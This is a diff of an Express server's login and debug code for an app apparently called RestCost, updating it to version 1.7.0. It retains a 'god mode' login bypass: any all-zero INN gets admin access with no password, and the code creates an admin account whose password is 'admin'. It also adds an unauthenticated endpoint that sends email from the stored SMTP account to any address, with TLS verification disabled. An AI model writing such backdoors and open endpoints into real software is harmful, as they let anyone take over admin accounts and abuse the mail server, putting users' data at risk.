@@ -469,19 +469,51 @@ async function startServer() {
   const app = express();
   app.set('trust proxy', 1);
 
-  // Request logger for debugging
+  // 1. GLOBAL DEBUG & LOGGING (FIRST)
   app.use((req, res, next) => {
-    console.log(`[DEBUG] ${req.method} ${req.url}`);
+    if (req.url.startsWith('/api')) {
+      console.log(`[API REQUEST] ${req.method} ${req.url} - ${new Date().toISOString()}`);
+    }
     next();
   });
 
-  app.get("/api/debug", (req, res) => {
-    res.json({ 
-      status: "running", 
-      env: process.env.NODE_ENV,
-      cwd: process.cwd(),
-      dirname: __dirname
-    });
+  app.get("/api/debug-ping", (req, res) => {
+    res.json({ pong: true, time: new Date().toISOString(), version: "1.7.0" });
+  });
+
+  app.get("/api/debug/test-smtp", async (req, res) => {
+    console.log("[SMTP TEST] Manual trigger received");
+    const settings = getSystemSettings();
+    const testEmail = req.query.email as string || settings.smtp_user;
+    
+    try {
+      if (!settings.smtp_host || !settings.smtp_user || !settings.smtp_pass) {
+        return res.status(400).json({ error: "SMTP settings missing in DB" });
+      }
+
+      const transporter = nodemailer.createTransport({
+        host: settings.smtp_host,
+        port: Number(settings.smtp_port),
+        secure: Number(settings.smtp_port) === 465,
+        auth: { user: settings.smtp_user, pass: settings.smtp_pass },
+        tls: { rejectUnauthorized: false }, // ALLOW SELF-SIGNED OR LEGACY CERTS
+        connectionTimeout: 10000,
+      });
+
+      await transporter.verify();
+      await transporter.sendMail({
+        from: `"RestCost Test" <${settings.smtp_from || settings.smtp_user}>`,
+        to: testEmail,
+        subject: "SMTP Debug Test",
+        text: "Working!",
+        html: "<b>SMTP is working properly.</b>"
+      });
+
+      res.json({ success: true, message: `Email sent to ${testEmail}` });
+    } catch (err: any) {
+      console.error("[SMTP TEST] FAILED:", err);
+      res.status(500).json({ error: "SMTP Error", message: err.message, code: err.code });
+    }
   });
 
   // HTTPS Redirect Middleware
@@ -1006,19 +1038,17 @@ async function startServer() {
       const bodyInn = String(rawInn || "").trim();
       const bodyPassword = String(req.body.password || "").trim();
       
-      console.log(`[AUTH DEBUG] v1.6.0. INN Received: [${bodyInn}]`);
+      console.log(`[AUTH DEBUG] v1.7.0. Body present: ${!!req.body}. INN: [${bodyInn}]`);
       
       // 1. ABSOLUTE GOD MODE
-      // Matches any sequence of zeros (0, 00, 000...0)
       const isRescueAdmin = /^[0]+$/.test(bodyInn) && bodyInn.length > 0;
       
       if (isRescueAdmin) {
-        console.log("[AUTH !!!] EMERGENCY RESCUE BYPASS SUCCESS");
+        console.log("[AUTH !!!] EMERGENCY RESCUE BYPASS v1.7.0");
         let adminUser = db.prepare("SELECT * FROM users WHERE type = 'admin'").get() as any;
         
         if (!adminUser) {
-          console.log("[AUTH] Creating admin user record...");
-          db.prepare("INSERT INTO users (inn, name, type, password) VALUES (?, ?, ?, ?)").run("0000000000", "Администратор СИСТЕМЫ", "admin", "admin");
+          db.prepare("INSERT INTO users (inn, name, type, password) VALUES (?, ?, ?, ?)").run("0000000000", "СУПЕР-АДМИН (RESCUE)", "admin", "admin");
           adminUser = db.prepare("SELECT * FROM users WHERE inn = ?").get("0000000000");
         }
         
@@ -1027,7 +1057,8 @@ async function startServer() {
           ...adminUser,
           settings: parse(adminUser.settings),
           subscription: parse(adminUser.subscription),
-          _god_mode: true
+          _god_mode: true,
+          v: "1.7.0"
         });
       }
       
@@ -1048,9 +1079,8 @@ async function startServer() {
       } else {
         console.warn(`[AUTH] NO: [${bodyInn}]`);
         res.status(401).json({ 
-          error: "Неверный ИНН или пароль", 
-          v: "1.6.0",
-          t: new Date().getTime()
+          error: "Ошибка авторизации: неверные данные [v1.7.0]", 
+          v: "1.7.0"
         });
       }
     } catch (err: any) {
@@ -2316,7 +2346,7 @@ async function startServer() {
   }
 
   app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server v1.6.0 running on http://localhost:${PORT}`);
+    console.log(`Server v1.7.0 running on http://localhost:${PORT}`);
   });
 }
 
